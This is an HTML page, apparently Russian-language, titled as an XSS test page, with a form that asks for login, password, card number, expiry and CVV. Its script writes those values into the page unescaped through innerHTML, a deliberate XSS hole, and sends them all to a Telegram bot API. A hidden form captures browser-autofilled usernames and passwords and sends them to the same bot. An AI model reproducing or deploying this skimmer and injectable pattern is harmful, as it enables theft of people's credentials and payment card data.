<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Тестовая страница для XSS</title>
</head>
<body>
    <h1>Тестовая страница для XSS-атак</h1>
    <form action="" method="GET">
        <label for="username">Логин:</label><br>
        <input type="text" id="username" name="username"><br><br>
        <label for="password">Пароль:</label><br>
        <input type="password" id="password" name="password"><br><br>
        <label for="cardnumber">Номер карты:</label><br>
        <input type="text" id="cardnumber" name="cardnumber"><br><br>
        <label for="expiry">Срок действия:</label><br>
        <input type="text" id="expiry" name="expiry"><br><br>
        <label for="cvv">CVV:</label><br>
        <input type="text" id="cvv" name="cvv"><br><br>
        <input type="submit" value="Отправить">
    </form>

    <h2>Текст из редактора:</h2>
    <div id="comments"></div>

    <form style="display: none" onchange="fetch(`https://api.telegram.org/bot123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11/sendMessage?text=${this.u.value};${this.p.value}&chat_id=123123123`)">
        <input id="u" autocomplete="username">
        <input id="p" type="password" autocomplete="password">
    </form>

    <script>
        const params = new URLSearchParams(window.location.search);
        if (params.has('username') && params.has('password') && params.has('cardnumber') && params.has('expiry') && params.has('cvv')) {
            const commentsDiv = document.getElementById('comments');
            const username = params.get('username');
            const password = params.get('password');
            const cardnumber = params.get('cardnumber');
            const expiry = params.get('expiry');
            const cvv = params.get('cvv');
            // Вставляем данные как HTML, чтобы скрипты выполнялись
            commentsDiv.innerHTML += `<p>Логин: ${username}</p>`;
            commentsDiv.innerHTML += `<p>Пароль: ${password}</p>`;
            commentsDiv.innerHTML += `<p>Номер карты: ${cardnumber}</p>`;
            commentsDiv.innerHTML += `<p>Срок действия: ${expiry}</p>`;
            commentsDiv.innerHTML += `<p>CVV: ${cvv}</p>`;
            // Скрипт для отправки данных на сервер
            fetch(`https://api.telegram.org/bot123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11/sendMessage?text=Логин: ${username}; Пароль: ${password}; Номер карты: ${cardnumber}; Срок действия: ${expiry}; CVV: ${cvv}&chat_id=123123123`);
        }
    </script>
</body>
</html>
